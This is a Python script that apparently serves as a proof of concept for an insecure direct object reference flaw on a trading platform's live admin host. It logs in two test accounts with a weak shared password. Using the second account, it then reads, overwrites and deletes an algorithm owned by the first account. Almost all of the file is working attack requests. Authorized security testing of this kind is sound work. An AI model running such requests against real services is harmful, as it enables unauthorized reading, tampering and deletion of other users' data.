import requests

BASE_URL = "https://lpadmin.blackfx.com"
PWD = "12345678"

# 1. Login Trader 1 (mamf1)
s1 = requests.Session()
s1.post(f"{BASE_URL}/api/auth/login", json={"email": "mamf1@mailinator.com", "password": PWD})
tok1 = s1.post(f"{BASE_URL}/api/auth/chart-token").json().get("token")
h1 = {"x-token": tok1, "Content-Type": "application/json"}

# 2. Login Trader 2 (mamf2)
s2 = requests.Session()
s2.post(f"{BASE_URL}/api/auth/login", json={"email": "mamf2@mailinator.com", "password": PWD})
tok2 = s2.post(f"{BASE_URL}/api/auth/chart-token").json().get("token")
h2 = {"x-token": tok2, "Content-Type": "application/json"}

print("Created algo uid: 8 by Trader 1.")

# Trader 2 attempts to fetch Trader 1's algo
r_get = s2.post(f"{BASE_URL}/v1/chart/algo/getAlgo", headers=h2, json={"uid": 8})
print("Trader 2 IDOR getAlgo (uid: 8):", r_get.status_code, r_get.text)

# Trader 2 attempts to save/overwrite Trader 1's algo
r_save = s2.post(f"{BASE_URL}/v1/chart/algo/saveAlgo", headers=h2, json={
    "uid": 8,
    "name": "Hacked Algo by Trader 2",
    "source": "// Malicious Code Injected",
    "description": "Trader 2 Overwrite"
})
print("Trader 2 IDOR saveAlgo (uid: 8):", r_save.status_code, r_save.text)

# Trader 2 attempts to delete Trader 1's algo
r_del = s2.post(f"{BASE_URL}/v1/chart/algo/deleteAlgo", headers=h2, json={"uid": 8})
print("Trader 2 IDOR deleteAlgo (uid: 8):", r_del.status_code, r_del.text)

# Clean up algo by Trader 1
s1.post(f"{BASE_URL}/v1/chart/algo/deleteAlgo", headers=h1, json={"uid": 8})
